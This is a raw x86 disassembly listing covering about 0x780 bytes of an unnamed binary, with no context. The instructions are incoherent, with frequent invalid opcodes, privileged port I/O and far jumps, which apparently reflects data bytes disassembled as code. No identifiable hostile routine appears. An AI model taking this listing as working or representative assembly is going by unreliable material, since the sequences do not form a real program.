  4117dd:	sub    cl,BYTE PTR [esi-0x3d]
  4117e0:	inc    eax
  4117e1:	(bad)  
  4117e2:	imul   edi,DWORD PTR ds:0xd820acaf,0x2c
  4117e9:	inc    ecx
  4117ea:	mov    ebp,0x9c4ada9a
  4117ef:	pop    edx
  4117f0:	adc    ah,bh
  4117f2:	lahf   
  4117f3:	retf   
  4117f4:	cmp    esp,DWORD PTR [ecx-0x54b0ea2a]
  4117fa:	rol    DWORD PTR [ecx-0x3e],1
  4117fd:	ins    DWORD PTR es:[edi],dx
  4117fe:	dec    edx
  4117ff:	push   0xb6ed59e1
  411804:	push   ebp
  411805:	fsub   QWORD PTR [esi]
  411807:	shl    al,1
  411809:	xor    cl,al
  41180b:	sti    
  41180c:	fild   QWORD PTR [ebx]
  41180e:	xor    cl,ah
  411810:	mov    al,0xec
  411812:	add    dl,bl
  411814:	adc    ebp,DWORD PTR [esi]
  411816:	sar    BYTE PTR [esi],cl
  411818:	sub    eax,0x4913a41d
  41181d:	fidiv  WORD PTR [esi-0x76]
  411820:	lods   al,BYTE PTR ds:[esi]
  411821:	mov    bl,0xce
  411823:	pop    esi
  411824:	dec    eax
  411825:	sub    dh,BYTE PTR [ebx+0x2d363a1e]
  41182b:	push   edi
  41182c:	(bad)  
  41182d:	outs   dx,BYTE PTR ds:[esi]
  41182e:	mov    esi,0xfd5ccf88
  411833:	fs jp  0x41187e
  411836:	std    
  411837:	stos   BYTE PTR es:[edi],al
  411838:	xor    ah,BYTE PTR [edi+0x58]
  41183b:	out    0x39,eax
  41183d:	push   ds
  41183e:	xlat   BYTE PTR ds:[ebx]
  41183f:	dec    esi
  411840:	push   es
  411841:	pop    ds
  411842:	enter  0x7277,0x62
  411846:	adc    ebx,ebp
  411848:	jno    0x4117d7
  41184a:	fld    DWORD PTR [ebp-0x42]
  41184d:	jbe    0x4118b4
  41184f:	in     al,0x89
  411851:	cs scas eax,DWORD PTR es:[edi]
  411853:	lods   eax,DWORD PTR ds:[esi]
  411854:	pop    ecx
  411855:	push   0x6b
  411857:	inc    esi
  411858:	xchg   edx,eax
  411859:	std    
  41185a:	or     bl,al
  41185c:	xor    edi,DWORD PTR [edi+0x67e9426b]
  411862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411863:	les    esp,FWORD PTR [edi+edx*1]
  411866:	(bad)  
  411867:	pop    ds
  411868:	lds    esp,FWORD PTR [eax+edi*2-0x7]
  41186c:	popf   
  41186d:	ret    
  41186e:	push   ecx
  41186f:	cdq    
  411870:	in     al,dx
  411871:	push   ebp
  411872:	xor    DWORD PTR [eax-0x75],edi
  411875:	ins    BYTE PTR es:[edi],dx
  411876:	mov    ds:0x7f78c3a,eax
  41187b:	xchg   esp,eax
  41187c:	frstor [esi]
  41187e:	push   cs
  41187f:	mov    edx,esp
  411881:	mov    DWORD PTR [edi+ebp*8+0x6b],ecx
  411885:	pop    es
  411886:	test   ebx,0xd552f169
  41188c:	mov    bl,0x3d
  41188e:	xor    esi,DWORD PTR [ebx+0x135b17f8]
  411894:	adc    BYTE PTR [edi],0xbc
  411897:	add    dh,BYTE PTR [ebx+0x7ac984b9]
  41189d:	and    BYTE PTR [edi],0xd0
  4118a0:	add    DWORD PTR [ebp+0x405ec8bb],esp
  4118a6:	jnp    0x411889
  4118a8:	fwait
  4118a9:	dec    ebx
  4118aa:	dec    edi
  4118ab:	xchg   edx,eax
  4118ac:	inc    ecx
  4118ad:	pop    esi
  4118ae:	mov    bl,0x35
  4118b0:	mov    dh,0x88
  4118b2:	sbb    BYTE PTR [edi-0x53759176],dh
  4118b8:	sar    DWORD PTR [esi+0x1c063fab],0xd9
  4118bf:	pop    ecx
  4118c0:	mov    fs,WORD PTR [ebx]
  4118c2:	adc    DWORD PTR [ebp+0x34],eax
  4118c5:	mov    DWORD PTR [edi-0x2e8fce4],ecx
  4118cb:	mov    eax,ds:0xe233b281
  4118d0:	or     DWORD PTR [ecx-0x4a],0xffffffed
  4118d4:	add    al,0x71
  4118d6:	dec    ecx
  4118d7:	(bad)  
  4118d8:	out    dx,al
  4118d9:	mov    ch,0x8d
  4118db:	retf   0xd437
  4118de:	(bad)  
  4118df:	data16 mov BYTE PTR [ecx+0x54],dl
  4118e3:	jns    0x411887
  4118e5:	sbb    edx,DWORD PTR [eax-0xd0d3656]
  4118eb:	ret    0x4b4b
  4118ee:	test   DWORD PTR ss:[eax],edx
  4118f1:	cs aad 0xea
  4118f4:	adc    eax,0xa23a23fd
  4118f9:	push   cs
  4118fa:	cs enter 0x87b6,0xf6
  4118ff:	std    
  411900:	retf   
  411901:	push   0x6a
  411903:	cmp    al,0x89
  411905:	cmp    DWORD PTR [ecx-0x50],ebx
  411908:	inc    eax
  411909:	je     0x411972
  41190b:	fcomi  st,st(2)
  41190d:	fdiv   DWORD PTR ds:0x8bf4541c
  411913:	dec    ebx
  411914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411915:	dec    ebx
  411916:	pop    eax
  411917:	mov    eax,ds:0x82a64c7
  41191c:	push   edx
  41191d:	mov    ebx,0x159ec200
  411922:	stos   DWORD PTR es:[edi],eax
  411923:	ret    0x5481
  411926:	lods   al,BYTE PTR ds:[esi]
  411927:	cmc    
  411928:	xor    ch,BYTE PTR [eax+0x7080196d]
  41192e:	add    al,al
  411930:	adc    eax,0x1ad039b0
  411935:	aas    
  411936:	push   ss
  411937:	add    DWORD PTR [edx],ebp
  411939:	lahf   
  41193a:	rcr    DWORD PTR [esi-0x59],0xc9
  41193e:	or     eax,0x70769fd8
  411943:	scas   ax,WORD PTR es:[edi]
  411945:	push   es
  411946:	pop    eax
  411947:	inc    edi
  411948:	or     edi,DWORD PTR [ebx+0x52]
  41194b:	xor    bl,ch
  41194d:	and    DWORD PTR [esi],edx
  41194f:	xor    bh,BYTE PTR [eax+ebx*2-0x70]
  411953:	mov    ch,0x12
  411955:	pop    edx
  411956:	bound  edi,QWORD PTR [edi+0x2bc705f9]
  41195c:	mov    cl,dl
  41195e:	fldenv [ebx]
  411960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411961:	jo     0x4119ae
  411963:	mov    esp,0xa6d30ad5
  411968:	or     esp,edi
  41196a:	in     al,dx
  41196b:	cmp    bh,BYTE PTR [eax]
  41196d:	(bad)  
  411970:	mov    ebx,0x20288bf9
  411975:	leave  
  411976:	mov    ch,0xff
  411978:	push   esi
  411979:	jmp    0x41192a
  41197b:	shr    BYTE PTR [ecx+0x2b],cl
  41197e:	xor    al,0x12
  411980:	sahf   
  411981:	xchg   BYTE PTR [edx+0x2515b568],bh
  411987:	cs push ecx
  411989:	cmp    DWORD PTR [edi],0x20
  41198c:	and    al,0x26
  41198e:	fimul  DWORD PTR [edx-0x2ad66be4]
  411994:	ss test esi,ebx
  411997:	add    DWORD PTR [edx+edx*4+0x1dc39aaf],ecx
  41199e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41199f:	xor    eax,0xa8fef40c
  4119a4:	dec    esp
  4119a5:	sub    eax,0xbca9801
  4119aa:	clc    
  4119ab:	loopne 0x4119b4
  4119ad:	scas   eax,DWORD PTR es:[edi]
  4119ae:	(bad)  
  4119af:	js     0x4119a2
  4119b1:	mov    ds:0xce0b1660,eax
  4119b6:	push   0x66
  4119b8:	ret    0xbac0
  4119bb:	aaa    
  4119bc:	sub    al,BYTE PTR [ebx-0x69]
  4119bf:	pop    ss
  4119c0:	dec    eax
  4119c1:	retf   0xe6c
  4119c4:	xor    DWORD PTR [eax],eax
  4119c6:	loope  0x4119af
  4119c8:	pop    ds
  4119c9:	sahf   
  4119ca:	cmp    dl,dl
  4119cc:	pop    edx
  4119cd:	mov    ds:0xa8152a47,eax
  4119d2:	add    DWORD PTR [ebp+0x12],eax
  4119d5:	jg     0x4119a5
  4119d7:	adc    eax,0x39de2a32
  4119dc:	mov    ebp,0xae22df7c
  4119e1:	xor    eax,DWORD PTR [edi-0x42183c1f]
  4119e7:	adc    al,0x76
  4119e9:	fmul   QWORD PTR [ebx+0x2e5daa58]
  4119ef:	aaa    
  4119f0:	mov    BYTE PTR [ecx+0x67],al
  4119f3:	daa    
  4119f4:	sahf   
  4119f5:	mov    esi,0x1dae8a19
  4119fa:	iret   
  4119fb:	mov    ch,0xc
  4119fd:	mov    bl,0x6e
  4119ff:	pop    ebx
  411a00:	pop    ds
  411a01:	jge    0x411a6f
  411a03:	(bad)  
  411a05:	push   eax
  411a06:	jb     0x411a26
  411a08:	or     BYTE PTR [esi],dl
  411a0a:	push   edi
  411a0b:	out    dx,al
  411a0c:	gs jmp 0xc9a7:0x22b6e06
  411a14:	test   BYTE PTR [ebp-0x78],0x10
  411a18:	inc    eax
  411a19:	scas   al,BYTE PTR es:[edi]
  411a1a:	mov    ebp,0xf89ba01
  411a1f:	lods   al,BYTE PTR ds:[esi]
  411a20:	out    0xf8,al
  411a22:	sbb    DWORD PTR [edi+0x4907ce87],0xffffffc9
  411a29:	cmp    esi,DWORD PTR [eax+esi*8]
  411a2c:	push   ds
  411a2d:	arpl   bx,di
  411a2f:	shl    DWORD PTR [eax],1
  411a31:	push   esi
  411a32:	xchg   ebp,eax
  411a33:	xchg   esi,eax
  411a34:	adc    DWORD PTR [eax+eax*1],0x36e06e7d
  411a3b:	pop    ds
  411a3c:	das    
  411a3d:	retf   0x1eae
  411a40:	push   edi
  411a41:	sub    al,0xea
  411a43:	push   esi
  411a44:	retf   0x8838
  411a47:	hlt    
  411a48:	mov    edi,0xab4ca772
  411a4d:	xchg   BYTE PTR [edi],al
  411a4f:	jge    0x4119ff
  411a51:	adc    BYTE PTR [ebx-0x2c13556b],dh
  411a57:	mov    edx,0x44f21311
  411a5c:	mov    bl,0x6a
  411a5e:	retf   
  411a5f:	fsubrp st(4),st
  411a61:	cmp    dl,BYTE PTR [eax-0x3c63aec7]
  411a67:	sub    ebx,DWORD PTR [eax]
  411a69:	out    dx,al
  411a6a:	fcmovbe st,st(5)
  411a6c:	sti    
  411a6d:	imul   ebp,DWORD PTR [esi+0x3fc6e5f1],0x5e
  411a74:	dec    ecx
  411a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a76:	sub    ecx,DWORD PTR [eax+0x6f]
  411a79:	push   0xaa185839
  411a7e:	jmp    0x505d:0xf3d6e6e9
  411a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a86:	and    eax,0x6a094dd3
  411a8b:	push   ecx
  411a8c:	test   al,0x66
  411a8e:	dec    ecx
  411a8f:	mov    esp,DWORD PTR [edx+0x40]
  411a92:	fs aas 
  411a94:	mul    DWORD PTR [esi]
  411a96:	pop    ds
  411a97:	stc    
  411a98:	inc    esp
  411a99:	mov    cl,0x9c
  411a9b:	jns    0x411b0d
  411a9d:	nop
  411a9e:	push   edx
  411a9f:	lds    esp,FWORD PTR [edx]
  411aa1:	in     eax,0x21
  411aa3:	retf   0xb05d
  411aa6:	pop    esi
  411aa7:	es add al,0xd3
  411aaa:	popf   
  411aab:	nop
  411aac:	sbb    al,0xac
  411aae:	out    0x89,al
  411ab0:	repnz xchg ebp,eax
  411ab2:	std    
  411ab3:	mov    ah,BYTE PTR [edi]
  411ab5:	int3   
  411ab6:	xor    ah,BYTE PTR [ecx-0xe]
  411ab9:	icebp  
  411aba:	dec    esi
  411abb:	cdq    
  411abc:	test   BYTE PTR [esi-0x71],bl
  411abf:	fidivr DWORD PTR [ecx-0x35]
  411ac2:	int    0x7
  411ac4:	xchg   ecx,eax
  411ac5:	fisub  WORD PTR [edx-0x2f]
  411ac8:	outs   dx,BYTE PTR ds:[esi]
  411ac9:	out    0xe2,eax
  411acb:	and    eax,0xc38d904e
  411ad0:	sti    
  411ad1:	xchg   edi,eax
  411ad2:	and    eax,0xbf2b27f7
  411ad7:	sub    al,0xd2
  411ad9:	xchg   ebp,eax
  411ada:	repz cmp cl,bh
  411add:	mov    al,0xba
  411adf:	call   0x39e0:0x27d19423
  411ae6:	mov    bl,0xab
  411ae8:	outs   dx,DWORD PTR ss:[esi]
  411aea:	mov    WORD PTR [edi+0x5f62ae93],es
  411af0:	out    dx,al
  411af1:	dec    ebx
  411af2:	ror    ah,cl
  411af4:	jecxz  0x411b39
  411af6:	cld    
  411af7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  411af9:	out    0xc8,al
  411afb:	fadd   st(2),st
  411afd:	scas   al,BYTE PTR es:[edi]
  411afe:	sbb    ch,BYTE PTR [ecx+0x7b]
  411b01:	(bad)  
  411b02:	mov    DWORD PTR [eax],ebp
  411b04:	mov    dl,0x43
  411b06:	inc    edx
  411b07:	mov    esp,DWORD PTR [eax-0x48f1af6c]
  411b0d:	aaa    
  411b0e:	xlat   BYTE PTR ds:[ebx]
  411b0f:	mov    edi,0x51459e4c
  411b14:	dec    esp
  411b15:	push   ebp
  411b16:	adc    eax,0x32f10e01
  411b1b:	inc    edx
  411b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b1d:	and    edx,esi
  411b1f:	lock pop ss
  411b21:	fiadd  WORD PTR [eax]
  411b23:	shl    bh,1
  411b25:	mov    esp,0xffc3d6db
  411b2a:	imul   ecx,esi,0xffffffb2
  411b2d:	mov    edx,0xa3b198f8
  411b32:	sbb    al,0x64
  411b34:	adc    ch,ah
  411b36:	sub    ebx,eax
  411b38:	or     DWORD PTR [edx+0x55],ecx
  411b3b:	inc    esp
  411b3c:	fsub   QWORD PTR [esi-0x6d]
  411b3f:	inc    ebx
  411b40:	sahf   
  411b41:	jecxz  0x411b5a
  411b43:	dec    ebx
  411b44:	outs   dx,BYTE PTR ds:[esi]
  411b45:	leave  
  411b46:	test   eax,0x4577e860
  411b4b:	xor    al,BYTE PTR [ebx]
  411b4d:	fiadd  DWORD PTR [ebx]
  411b4f:	xor    al,0x78
  411b51:	jmp    0x411b74
  411b53:	inc    ecx
  411b54:	(bad)  
  411b56:	int3   
  411b57:	into   
  411b58:	cmp    al,0x49
  411b5a:	xor    bh,BYTE PTR [esi+0x215cf838]
  411b60:	xchg   edx,eax
  411b61:	and    ah,BYTE PTR [ecx+0x22]
  411b64:	aas    
  411b65:	outs   dx,DWORD PTR ds:[esi]
  411b66:	xchg   cl,dh
  411b68:	lds    esi,FWORD PTR [esi-0x2d01268d]
  411b6e:	rcl    BYTE PTR [ecx],1
  411b70:	xchg   DWORD PTR [eax-0x177f0143],ebp
  411b76:	test   al,0xe0
  411b78:	inc    edi
  411b79:	xor    esp,DWORD PTR [edx]
  411b7b:	outs   dx,DWORD PTR ds:[esi]
  411b7c:	or     bl,0x14
  411b7f:	dec    eax
  411b80:	out    dx,eax
  411b81:	ins    BYTE PTR es:[edi],dx
  411b82:	mov    eax,ds:0x2235a741
  411b87:	mov    ch,0x96
  411b89:	cs inc edi
  411b8b:	shl    BYTE PTR [ebx-0x6a0d6eed],1
  411b91:	scas   al,BYTE PTR es:[edi]
  411b92:	test   eax,0xb7ada1eb
  411b97:	rcl    DWORD PTR [eax],0x28
  411b9a:	xchg   esp,eax
  411b9b:	push   ss
  411b9c:	mov    ah,0x3d
  411b9e:	cld    
  411b9f:	das    
  411ba0:	cmp    al,0x5
  411ba2:	test   al,0xf9
  411ba4:	add    al,0x80
  411ba6:	std    
  411ba7:	adc    esp,esp
  411ba9:	imul   edx,esi,0xffffffef
  411bac:	into   
  411bad:	mov    al,ds:0xd4b77084
  411bb2:	or     BYTE PTR [ecx],al
  411bb4:	(bad)  
  411bb5:	daa    
  411bb6:	into   
  411bb7:	or     bh,dh
  411bb9:	and    eax,0x3b089e11
  411bbe:	test   al,0x48
  411bc0:	pop    ds
  411bc1:	add    al,0x88
  411bc3:	stos   BYTE PTR es:[edi],al
  411bc4:	loopne 0x411c44
  411bc6:	popf   
  411bc7:	outs   dx,DWORD PTR ds:[esi]
  411bc8:	mov    dl,0xc9
  411bca:	jns    0x411bc8
  411bcc:	in     eax,0x5d
  411bce:	mov    ebx,0xf54cf7aa
  411bd3:	cmp    eax,0x686a238d
  411bd8:	and    DWORD PTR [ecx-0x73],0x2ac6fdb9
  411bdf:	scas   eax,DWORD PTR es:[edi]
  411be0:	test   eax,0x47bb051a
  411be5:	pop    ss
  411be6:	(bad)  
  411be7:	push   ss
  411be8:	daa    
  411be9:	mov    edx,0x154b1d61
  411bee:	jns    0x411bbb
  411bf0:	mov    es,WORD PTR [ebx+esi*4-0x472527f2]
  411bf7:	cmp    ebp,DWORD PTR [ecx+0x3892ee94]
  411bfd:	mov    eax,0xf47d8c4
  411c02:	push   edi
  411c03:	out    dx,eax
  411c04:	ins    DWORD PTR es:[edi],dx
  411c05:	(bad)  
  411c06:	stc    
  411c07:	sti    
  411c08:	rcr    dl,cl
  411c0a:	leave  
  411c0b:	neg    ch
  411c0d:	daa    
  411c0e:	and    ah,BYTE PTR [ebx]
  411c10:	shr    DWORD PTR [edi],cl
  411c12:	aad    0x8c
  411c14:	and    DWORD PTR [esi+eax*1+0xb5fe970],0x5e25ed0a
  411c1f:	push   ecx
  411c20:	aas    
  411c21:	(bad)  [esp+eiz*8+0x40]
  411c25:	inc    ecx
  411c26:	xor    al,BYTE PTR [ecx]
  411c28:	xlat   BYTE PTR ss:[bx]
  411c2b:	mov    ah,0xe4
  411c2d:	mov    ebx,0xfe78269d
  411c32:	scas   al,BYTE PTR es:[edi]
  411c33:	jg     0x411bfe
  411c35:	mov    bl,bl
  411c37:	jno    0x411c38
  411c39:	mov    ch,BYTE PTR [edx-0x5b80f96f]
  411c3f:	or     BYTE PTR [esi+0x5b],0x94
  411c43:	lods   eax,DWORD PTR ds:[esi]
  411c44:	icebp  
  411c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c46:	mov    edi,0xcea5a54a
  411c4b:	pop    esi
  411c4c:	xchg   edi,eax
  411c4d:	icebp  
  411c4e:	test   ecx,ecx
  411c50:	inc    ebx
  411c51:	xor    al,0x6d
  411c53:	mov    dh,0x83
  411c55:	xchg   esp,ebx
  411c57:	sbb    bh,bh
  411c59:	int    0x21
  411c5b:	sub    al,dl
  411c5d:	mov    ebx,0x36df14c0
  411c62:	mov    WORD PTR [edx+ebx*2],fs
  411c65:	fld    QWORD PTR [esi]
  411c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c68:	push   ebx
  411c69:	pop    ss
  411c6a:	ret    
  411c6b:	sbb    esp,esi
  411c6d:	pop    edi
  411c6e:	out    0x17,al
  411c70:	mov    edx,0xb917a070
  411c75:	mov    ds:0x811f28e3,eax
  411c7a:	mov    esp,0xa5c3f4c5
  411c7f:	jecxz  0x411cd9
  411c81:	dec    eax
  411c82:	mov    DWORD PTR [ecx+0x4d],esp
  411c85:	inc    esi
  411c86:	arpl   si,ax
  411c88:	and    cl,BYTE PTR ds:0x5791876d
  411c8e:	sbb    esi,DWORD PTR [ebp+0x1899a368]
  411c94:	inc    esi
  411c95:	loopne 0x411cf7
  411c97:	jmp    0xd27c:0xcc41bde7
  411c9e:	push   eax
  411c9f:	jmp    0x160e84d7
  411ca4:	inc    eax
  411ca5:	jle    0x411c65
  411ca7:	ret    0x8625
  411caa:	inc    ebp
  411cab:	mov    al,0x12
  411cad:	jb     0x411c5b
  411caf:	inc    eax
  411cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cb1:	jl     0x411c3a
  411cb3:	into   
  411cb4:	(bad)  
  411cb5:	mov    ds:0x66d270bc,eax
  411cba:	out    0xd6,eax
  411cbc:	ins    BYTE PTR es:[edi],dx
  411cbd:	sub    al,0x27
  411cbf:	push   es
  411cc0:	sti    
  411cc1:	and    dl,BYTE PTR [ebp-0x6]
  411cc4:	mov    al,0xc6
  411cc6:	cmp    eax,0x7fa1e7b4
  411ccb:	das    
  411ccc:	adc    al,0xc5
  411cce:	xor    al,0x81
  411cd0:	mov    bh,0xcc
  411cd2:	fbld   TBYTE PTR [ebx+edx*8+0x54]
  411cd6:	dec    eax
  411cd7:	into   
  411cd8:	pop    es
  411cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cda:	and    eax,0x8b99c8cd
  411cdf:	or     BYTE PTR [edx],0x93
  411ce2:	mov    ch,0x8c
  411ce4:	inc    edi
  411ce5:	jne    0x411c81
  411ce7:	mov    ebx,0x9cd49fd5
  411cec:	pusha  
  411ced:	clc    
  411cee:	xor    BYTE PTR [ebx-0x5b34804],dh
  411cf4:	sub    edi,DWORD PTR [ecx]
  411cf6:	or     eax,0x4fd4a455
  411cfb:	std    
  411cfc:	cmp    al,0x61
  411cfe:	sahf   
  411cff:	push   0x65
  411d01:	ds repnz sahf 
  411d04:	push   ss
  411d05:	iret   
  411d06:	mov    eax,0xe3b90ce4
  411d0b:	adc    esi,esp
  411d0d:	sbb    eax,0x83ca2315
  411d12:	dec    dl
  411d14:	push   ebx
  411d15:	or     DWORD PTR [esi+ebp*1+0x5a],esi
  411d19:	cs retf 0xfcd7
  411d1d:	clc    
  411d1e:	retf   0xa64a
  411d21:	fist   DWORD PTR [ebp+0x56e7bb29]
  411d27:	in     eax,0xc3
  411d29:	loop   0x411ce3
  411d2b:	es mov cl,0xa7
  411d2e:	mov    ch,0xb5
  411d30:	ins    BYTE PTR es:[edi],dx
  411d31:	mov    al,ds:0x35221753
  411d36:	jmp    0x411d94
  411d38:	loope  0x411da8
  411d3a:	pop    ss
  411d3b:	mov    gs,WORD PTR [edx+0x7d]
  411d3e:	mov    bh,BYTE PTR [esi+0x3]
  411d41:	sar    BYTE PTR [ebx-0x57],0x87
  411d45:	sub    eax,0x29607d51
  411d4a:	mov    esp,0xe17f8195
  411d4f:	push   esp
  411d50:	push   es
  411d51:	xchg   BYTE PTR [edi],cl
  411d53:	lds    eax,FWORD PTR [ebp+0x4a]
  411d56:	test   DWORD PTR [eax-0x67],ebp
  411d59:	push   esi
  411d5a:	mov    WORD PTR [ecx+0x6cdc3c60],es
  411d60:	(bad)  
  411d61:	cdq    
  411d62:	out    dx,al
  411d63:	hlt    
  411d64:	jo     0x411dbf
  411d66:	inc    esi
  411d67:	sbb    eax,0x4c54e9ff
  411d6c:	rcr    DWORD PTR [ebx-0x564df8d5],0xdd
  411d73:	and    ebp,0x2c
  411d76:	sahf   
  411d77:	mov    eax,ds:0x8706f0f4
  411d7c:	mov    bh,0x98
  411d7e:	adc    cl,BYTE PTR [edx+0x69]
  411d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d82:	sbb    ebp,DWORD PTR [eax+0x19026a9c]
  411d88:	neg    DWORD PTR [eax+0x78]
  411d8b:	and    eax,0xd53b77b2
  411d90:	cmp    edi,DWORD PTR [edi-0x5663ea56]
  411d96:	xchg   ebp,eax
  411d97:	(bad)  
  411d98:	mov    eax,ds:0x60f87448
  411d9d:	jno    0x411e18
  411d9f:	mov    edi,0x1fe29db7
  411da4:	stos   DWORD PTR es:[edi],eax
  411da5:	fsub   st(3),st
  411da7:	ror    BYTE PTR [ebx-0x41],cl
  411daa:	cmp    DWORD PTR [ebp+0x7b9a8e12],0x8a8128ac
  411db4:	jmp    0x1ed86e4a
  411db9:	scas   al,BYTE PTR es:[edi]
  411dba:	addr16 out dx,al
  411dbc:	test   BYTE PTR [esi+0x4a61fad6],al
  411dc2:	dec    ebp
  411dc3:	retf   0x94a0
  411dc6:	test   DWORD PTR [esi-0x32],0x6dae27e5
  411dcd:	add    BYTE PTR [esi-0x597cad17],bh
  411dd3:	cli    
  411dd4:	popf   
  411dd5:	inc    eax
  411dd6:	or     eax,0x5675f881
  411ddb:	aaa    
  411ddc:	push   edi
  411ddd:	pop    ds
  411dde:	xchg   DWORD PTR [edi],ebx
  411de0:	lods   al,BYTE PTR ds:[esi]
  411de1:	push   ebx
  411de2:	outs   dx,DWORD PTR ds:[esi]
  411de3:	lods   al,BYTE PTR ds:[esi]
  411de4:	(bad)
  411de8:	pop    ds
  411de9:	dec    esp
  411dea:	add    ebp,DWORD PTR [edx]
  411dec:	cmc    
  411ded:	daa    
  411dee:	jp     0x411e6f
  411df0:	cdq    
  411df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df2:	stc    
  411df3:	retf   
  411df4:	adc    DWORD PTR ds:0xa492025b,esi
  411dfa:	mov    DWORD PTR [esi],ebp
  411dfc:	mov    edi,0x1b7fd7b1
  411e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e02:	rol    BYTE PTR [esi-0x36],cl
  411e05:	inc    edi
  411e06:	mov    ebx,0x6681a608
  411e0b:	repz mul BYTE PTR [ebp-0x1a2c508b]
  411e12:	ins    DWORD PTR es:[edi],dx
  411e13:	jmp    0x423a:0x149d0f1c
  411e1a:	jg     0x411e75
  411e1c:	mov    WORD PTR [esi+0xe2884d0],cs
  411e22:	mov    ?,WORD PTR [ecx+0x6f]
  411e25:	clc    
  411e26:	icebp  
  411e27:	fwait
  411e28:	and    bh,al
  411e2a:	in     eax,0xb1
  411e2c:	or     DWORD PTR [ebp+0x5a],esi
  411e2f:	jecxz  0x411e2d
  411e31:	jbe    0x411df5
  411e33:	imul   eax,DWORD PTR [ecx-0x22],0xfd8ab2dc
  411e3a:	stos   BYTE PTR es:[edi],al
  411e3b:	ret    0x4b8a
  411e3e:	jp     0x411e37
  411e40:	sbb    BYTE PTR [ebx],dh
  411e42:	pop    ss
  411e43:	gs jmp 0x411df6
  411e46:	cmc    
  411e47:	or     DWORD PTR [edi+0x503f2640],0x30
  411e4e:	mov    edx,0x26480dc8
  411e53:	add    DWORD PTR [ebx-0x72f5f486],0xffffffcc
  411e5a:	fldenv [ebp+0x4437b3b7]
  411e60:	addr16 fst st(3)
  411e63:	scas   al,BYTE PTR es:[edi]
  411e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e65:	or     BYTE PTR [ecx-0x3e],ah
  411e68:	cmp    al,0xb9
  411e6a:	jnp    0x411e58
  411e6c:	cmp    DWORD PTR [edx*4-0x6bad2d0],ebx
  411e73:	aas    
  411e74:	stos   DWORD PTR es:[edi],eax
  411e75:	pop    es
  411e76:	sbb    al,0xe7
  411e78:	jmp    DWORD PTR [edi-0x43]
  411e7b:	icebp  
  411e7c:	adc    eax,0x101300a7
  411e81:	pushf  
  411e82:	pop    ds
  411e83:	push   edi
  411e84:	fist   WORD PTR ds:0x90d9e468
  411e8a:	adc    ebx,ebp
  411e8c:	xchg   DWORD PTR [edi],esp
  411e8e:	pop    edi
  411e8f:	push   cs
  411e90:	push   edi
  411e91:	out    0xc5,eax
  411e93:	in     eax,0xc8
  411e95:	xchg   ebx,eax
  411e96:	push   ss
  411e97:	jp     0x411e42
  411e99:	outs   dx,BYTE PTR ds:[esi]
  411e9a:	mov    ecx,0x38a4f1a9
  411e9f:	inc    edi
  411ea0:	test   al,0x69
  411ea2:	cmp    eax,0x68bce425
  411ea7:	lods   eax,DWORD PTR ds:[esi]
  411ea8:	adc    cl,dh
  411eaa:	cmp    al,0x1
  411eac:	and    eax,0x588e87a5
  411eb1:	add    al,bl
  411eb3:	xor    BYTE PTR ds:0xeda6aea7,dh
  411eb9:	and    al,0x8d
  411ebb:	add    eax,0x5ca5a487
  411ec0:	mov    ch,0x80
  411ec2:	sar    DWORD PTR [edx+esi*8+0x1b751d1e],cl
  411ec9:	ds push 0x28f8291b
  411ecf:	push   cs
  411ed0:	dec    eax
  411ed1:	lahf   
  411ed2:	push   ebx
  411ed3:	xor    esi,DWORD PTR [edx]
  411ed5:	mov    dh,0xe4
  411ed7:	out    0x97,eax
  411ed9:	aad    0x1f
  411edb:	pop    eax
  411edc:	(bad)  
  411edd:	xchg   esp,eax
  411ede:	ds enter 0x21a,0x5a
  411ee3:	loopne 0x411ed1
  411ee5:	xor    BYTE PTR [ebx],ah
  411ee7:	iret   
  411ee8:	mov    al,0x46
  411eea:	mov    edi,0xa46ba423
  411eef:	lds    eax,FWORD PTR [ecx+0x4a4e34ad]
  411ef5:	add    eax,DWORD PTR ds:0x18e87aa4
  411efb:	cmc    
  411efc:	lods   eax,DWORD PTR ds:[esi]
  411efd:	in     al,dx
  411efe:	dec    eax
  411eff:	add    eax,0x39d795c1
  411f04:	mov    edi,0xc06bf0e3
  411f09:	xlat   BYTE PTR ds:[ebx]
  411f0a:	and    ebp,eax
  411f0c:	push   ds
  411f0d:	js     0x411eda
  411f0f:	scas   al,BYTE PTR es:[edi]
  411f10:	lods   al,BYTE PTR ds:[esi]
  411f11:	sub    DWORD PTR [ecx+edx*8],edi
  411f14:	xor    bh,BYTE PTR [ebp+eiz*2-0x2b]
  411f18:	sbb    ebx,DWORD PTR [eax+0x6e5ce4b0]
  411f1e:	jmp    0x8d79819e
  411f23:	inc    edi
  411f24:	xchg   edx,eax
  411f25:	fadd   st(2),st
  411f27:	cld    
  411f28:	pop    ecx
  411f29:	das    
  411f2a:	jmp    0x7f65:0xeb7e757a
  411f31:	ret    
  411f32:	cmp    dh,BYTE PTR [esi]
  411f34:	jae    0x411f98
  411f36:	push   0x8efb5fa4
  411f3b:	mov    ah,BYTE PTR [edi]
  411f3d:	sbb    al,0xcc
  411f3f:	cmp    BYTE PTR [edi+esi*2],bl
  411f42:	jmp    0x411fa2
  411f44:	mov    ah,0xe3
  411f46:	leave  
  411f47:	fisttp DWORD PTR [edi+0x55]
  411f4a:	mov    edi,0xd53c237a
  411f4f:	ret    0x90fe
  411f52:	rcr    BYTE PTR [eax-0x15d3942b],cl
  411f58:	jnp    0x411f2d
  411f5a:	jecxz  0x411fc1
  411f5c:	ja     0x411f14
  411f5e:	cmp    BYTE PTR [edi],dh
  411f60:	repnz ins DWORD PTR es:[edi],dx
  411f62:	push   ecx
  411f63:	dec    ebp
